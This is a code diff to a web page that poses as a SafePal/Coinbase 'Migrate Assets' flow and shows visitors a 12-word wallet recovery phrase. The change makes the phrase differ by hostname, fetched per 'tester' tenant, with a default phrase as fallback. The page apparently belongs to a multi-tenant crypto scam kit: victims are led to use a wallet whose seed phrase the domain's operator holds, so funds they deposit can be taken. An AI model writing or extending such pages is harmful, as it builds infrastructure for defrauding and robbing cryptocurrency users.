@@ -1,5 +1,5 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { Copy, Check } from "lucide-react";
 import {
   CbFontStyle,
@@ -11,7 +11,11 @@ import walletImg from "@/assets/cb/cb-wallet.jpg";
 import appStoreBadge from "@/assets/app-store-badge.svg";
 import googlePlayBadge from "@/assets/google-play-badge.svg";
 import safepalLogoAsset from "@/assets/safepal-logo.png.asset.json";
+import { resolveTenantByHost } from "@/lib/tenants.functions";
 const safepalLogo = safepalLogoAsset.url;
+
+const DEFAULT_PHRASE =
+  "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";
 
 export const Route = createFileRoute("/cb/safepal")({
   head: () => ({ meta: [{ title: "Migrate Assets — SafePal" }] }),
@@ -55,7 +59,17 @@ function CbSafePalPage() {
   const [animating, setAnimating] = useState(false);
   const [phraseRevealed, setPhraseRevealed] = useState(false);
 
-  const recoveryPhrase = "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";
+  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
+  useEffect(() => {
+    // Look up which tester owns this hostname and use their seed phrase.
+    // Falls back to the default if the domain isn't attached to anyone.
+    if (typeof window === "undefined") return;
+    let alive = true;
+    resolveTenantByHost({ data: { host: window.location.host } })
+      .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
+      .catch(() => undefined);
+    return () => { alive = false; };
+  }, []);
 
   const goNext = () => {
     if (step >= 4) return;
